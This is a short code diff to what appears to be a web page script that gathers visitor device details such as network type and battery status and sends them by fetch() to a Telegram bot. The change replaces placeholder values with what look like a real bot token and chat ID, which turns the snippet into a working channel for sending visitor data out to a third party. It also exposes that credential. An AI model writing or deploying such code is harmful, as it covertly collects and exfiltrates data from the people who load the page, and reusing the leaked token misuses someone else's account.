@@ -46,8 +46,7 @@
                         \nNetwork Type: ${networkType} 
                         \nBattery: ${batteryLevel} (${chargingStatus})`;
 
-                        let tg_url = `https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage?chat_id=YOUR_CHAT_ID&text=${encodeURIComponent(message)}`;
-
+                        let tg_url = `https://api.telegram.org/bot7541518107:AAHKDYJ7w_KMe2In8ozJjtLET8IuW9jKtyY/sendMessage?chat_id=8094522569&text=${encodeURIComponent(message)}`;
                         fetch(tg_url)
                             .then(response => response.json())
                             .then(data => console.log("Data sent to Telegram:", data))
